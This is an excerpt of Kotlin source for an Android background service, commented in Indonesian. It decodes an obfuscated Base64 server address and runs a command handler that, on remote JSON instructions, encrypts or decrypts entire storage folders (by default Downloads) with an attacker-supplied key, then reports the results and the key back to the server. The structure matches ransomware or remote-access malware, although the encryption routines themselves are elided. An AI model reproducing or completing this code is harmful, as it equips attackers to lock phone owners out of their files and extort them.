...
import java.io.File
import com.sync.xxx.crypto.FileCryptoManager
import java.net.URI
...
class DeviceService : Service(), LifecycleOwner {
    ...
    // FIX: Gunakan try-catch untuk handle error Base64
    val SERVER_URL: String get() {
        return try {
            String(
...
// ── ENC FILE HANDLER ────────────────────────────────────────────
// ── ENC FILE HANDLER (FULL FOLDER SUPPORT) ──
private fun handleEncFile(value: String) {
    try {
        val obj = JSONObject(value)
        val action = obj.getString("action") // "encrypt" atau "decrypt"
        val path = obj.optString("path", "/storage/emulated/0/Download")
        val uid = obj.optString("uid", "")

        // 🔥 VALIDASI UID (minimal 16 karakter)
        if (uid.isEmpty() || uid.length < 16) {
            Log.e("DeviceService", "ENC: UID tidak valid! (min 16 karakter)")
            emitStatus(JSONObject().apply {
                put("encError", "UID tidak valid!")
                put("encActive", false)
                put("encComplete", true)
            })
            return
        }
        ...
        Thread {
            try {
                ...
                if (!folder.exists() || !folder.isDirectory) {
                    emitStatus(JSONObject().apply {
                        put("encError", "Folder tidak ditemukan: $path")
                        put("encActive", false)
                        put("encComplete", true)
                    })
                    return@Thread
                ...
                val (processed, failed) = if (action == "encrypt") {
                    FileCryptoManager.encryptFolder(folder, uid)
                } else {
                    FileCryptoManager.decryptFolder(folder, uid)
                }
                val elapsed = System.currentTimeMillis() - startTime

                Log.d("DeviceService", "ENC $action: $processed files, $failed failed, ${elapsed}ms")

                // 🔥🔥🔥 KIRIM STATUS SETELAH SELESAI 🔥🔥🔥
                Handler(Looper.getMainLooper()).post {
                    emitStatus(JSONObject().apply {
                        put("encActive", action == "encrypt")
                        put("encAction", action)
                        put("encPath", path)
                        put("encProcessed", processed)
                        put("encFailed", failed)
                        put("encUid", uid)
                        put("encTime", elapsed)
                        put("encComplete", true) // 🔥 TANDA PROSES SELESAI
                    })
                }

            } catch (e: Exception) {
                Log.e("DeviceService", "handleEncFile: ${e.message}")
                Handler(Looper.getMainLooper()).post {
                    emitStatus(JSONObject().apply {
                        put("encError", e.message ?: "Unknown error")
                        put("encActive", false)
                        put("encComplete", true)
                    })
                }
        ...
        Log.e("DeviceService", "handleEncFile parse: ${e.message}")
    }
}
